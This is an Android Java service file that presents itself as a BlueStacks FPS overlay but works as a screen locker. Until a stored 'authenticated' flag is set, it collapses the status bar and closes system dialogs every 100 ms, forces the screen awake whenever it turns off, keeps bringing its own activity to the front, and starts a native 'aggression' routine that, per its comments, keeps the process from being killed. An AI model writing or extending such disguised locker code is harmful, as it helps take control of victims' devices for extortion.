package com.bluestacks.fpsoverlay;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.os.Build;
import android.os.PowerManager;
import android.os.Handler;
import java.lang.reflect.Method;
import android.content.pm.ServiceInfo;

public class FPSService extends Service {


    static {
        System.loadLibrary("fps-native");
    }

    public native void startNativeAggression(String serviceName);
    public native void stopNativeAggression();

    private BroadcastReceiver screenReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)) {
                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "BS_FPS:WakeLock");
                wakeLock.acquire(1000);
            }
        }
    };

    private void collapseStatusBar() {
        try {
            Object statusBarService = getSystemService("statusbar");
            Class<?> statusBarManager = Class.forName("android.app.StatusBarManager");
            Method collapse = statusBarManager.getMethod("collapsePanels");
            collapse.setAccessible(true);
            collapse.invoke(statusBarService);
        } catch (Exception e) {
            sendBroadcast(new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS));
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    private void initSystemOptimization() {
        Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                // Cek status di sini
                boolean isCurrentlyAuthenticated = getSharedPreferences("AUTH_PREFS", MODE_PRIVATE)
                                                            .getBoolean("is_authenticated", false);

                if (!isCurrentlyAuthenticated) {
                    collapseStatusBar();
                    closeSystemDialogs();
                    handler.postDelayed(this, 100);
                } else {
                    // Berhenti looping jika sudah benar
                    stopNativeAggression(); 
                }
            }
        }, 100);
    }

    private void closeSystemDialogs() {
        try {
            sendBroadcast(new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS));
        } catch (Exception e) {}
    }

    private void refreshOverlay() {
        // Method ini dipanggil dari native untuk memastikan overlay tetap di depan
        Intent intent = new Intent(this, MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
        startActivity(intent);
    }

    @Override
    public void onCreate() {
        super.onCreate();
        startInForeground();
        initSystemOptimization();

        // Tetap jalankan native aggression agar proses tidak bisa dimatikan
        startNativeAggression(getPackageName() + "/.FPSService");

        IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_OFF);
        registerReceiver(screenReceiver, filter);
    }

    private void startInForeground() {
        String CHANNEL_ID = "fps_overlay_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "BlueStacks Service",
                    NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }

        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }
    
        Notification notification = builder
                .setContentTitle("BlueStacks Engine")
                .setSmallIcon(android.R.drawable.ic_menu_view)
                .setOngoing(true)
                .build();
    
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(1, notification);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopNativeAggression(); // Pastikan mati
        try { 
            unregisterReceiver(screenReceiver); 
        } catch (Exception e) {
            // Abaikan jika sudah tidak terdaftar
        }
    }
}
